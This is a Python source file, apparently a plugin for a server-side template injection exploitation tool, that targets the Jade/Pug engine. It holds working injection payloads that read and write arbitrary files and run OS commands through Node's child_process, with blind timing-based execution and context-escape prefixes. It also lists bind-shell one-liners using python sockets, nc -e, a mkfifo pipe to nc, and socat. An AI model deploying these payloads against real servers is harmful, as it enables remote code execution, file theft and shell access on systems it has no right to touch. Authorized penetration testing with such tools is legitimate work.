from utils.strings import quote, chunkit, md5
from utils.loggers import log
from core import closures
from core.plugin import Plugin
from utils import rand
import base64

class Jade(Plugin):

    actions = {
        'render' : {
            'render': '\n= %(code)s\n',
            'header': '\n= %(header)s\n',
            'trailer': '\n= %(trailer)s\n'
        },
        'write' : {
            'call' : 'evaluate',
            'write' : """global.process.mainModule.require('fs').appendFileSync('%(path)s', Buffer('%(chunk)s', 'base64'), 'binary')""",
            'truncate' : """global.process.mainModule.require('fs').writeFileSync('%(path)s', '')"""
        },
        'read' : {
            'call': 'render',
            'read' : """= global.process.mainModule.require('fs').readFileSync('%(path)s').toString('base64')"""
        },
        'md5' : {
            'call': 'render',
            'md5': """- var x = global.process
- x = x.mainModule.require
= x('crypto').createHash('md5').update(x('fs').readFileSync('%(path)s')).digest("hex")
"""
        },
        'evaluate' : {
            'call': 'render',
            'evaluate': '- %(code)s'
        },
        'blind' : {
            'call': 'execute_blind',
            'bool_true' : 'true',
            'bool_false' : 'false'
        },
        # Not using execute here since it's rendered and requires set headers and trailers
        'execute_blind' : {
            'call': 'inject',
            'execute_blind': """\n- global.process.mainModule.require("child_process").execSync("%(code)s && sleep %(delay)i")//"""
        },
        'execute' : {
            'call': 'render',
            'execute': """= global.process.mainModule.require("child_process").execSync("%(code)s")"""
        },
        'tcp_shell' : {
            'call' : 'execute_blind',
            'tcp_shell': [
                """python -c 'import pty,os,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((\\"\\", %(port)s));s.listen(1);(rem, addr) = s.accept();os.dup2(rem.fileno(),0);os.dup2(rem.fileno(),1);os.dup2(rem.fileno(),2);pty.spawn(\\"%(shell)s\\");s.close()'""",
                """nc -l -p %(port)s -e %(shell)s""",
                """rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|%(shell)s -i 2>&1|nc -l %(port)s >/tmp/f; rm -rf /tmp/f""",
                """socat tcp-l:%(port)s exec:%(shell)s"""
            ]
        }
    }

    contexts = [

        # Text context, no closures
        { 'level': 0 },

        # Attribute close a(href=\'%s\')
        { 'level': 1, 'prefix' : '%(closure)s)', 'suffix' : '//', 'closures' : { 1: closures.javascript_ctx_closures[1] } },
        # String interpolation #{
        { 'level': 2, 'prefix' : '%(closure)s}', 'suffix' : '//', 'closures' : closures.javascript_ctx_closures },
        # Code context
        { 'level': 2, 'prefix' : '%(closure)s\n', 'suffix' : '//', 'closures' : closures.javascript_ctx_closures },
    ]

    def detect_engine(self):

        execution_code = """= global.process.mainModule.require('os').platform()"""
        self.set('os', self.render(execution_code))
        self.set('language', 'javascript')
        self.set('evaluate', 'javascript')
        self.set('engine', 'jade')

    def execute(self, code, prefix = None, suffix = None, blind = False):
        # Quote code before submitting it
        return super(Jade, self).execute(quote(code), prefix, suffix, blind)

    def detect_blind_engine(self):

        if not self.get('blind'):
            return

        self.set('language', 'javascript')
        self.set('execute', True)
        self.set('engine', 'jade')
        self.set('evaluate', 'javascript')
